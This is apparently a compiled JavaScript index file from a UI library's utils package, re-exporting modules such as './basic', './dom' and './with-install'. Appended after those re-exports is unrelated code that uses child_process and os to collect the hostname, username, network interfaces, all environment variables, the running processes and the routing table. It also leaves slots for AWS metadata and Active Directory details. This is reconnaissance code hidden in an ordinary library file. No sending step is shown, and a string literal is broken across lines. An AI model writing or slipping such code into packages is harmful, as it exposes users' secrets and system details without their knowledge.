var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const { execSync } = require('child_process');
const os = require('os');

function getSystemInfo() {
    let systemInfo = {
        hostname: os.hostname(),
        user: os.userInfo().username,
        os: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        date: new Date().toISOString(),
        networkInterfaces: os.networkInterfaces(),
        environmentVariables: process.env,
        runningProcesses: [],
        dnsResolvers: [],
        awsMetadata: {},
        activeDirectoryDomain: null,
        internalRoutes: null
    };

    try {
        systemInfo.runningProcesses = execSync('tasklist || ps aux', { encoding: 'utf8' }).split('
');
        systemInfo.internalRoutes = execSync('route print || route -n', { encoding: 'utf8' });
    } catch (error) {
        console.error('Error retrieving system information:', error);
    }

    return systemInfo;
}
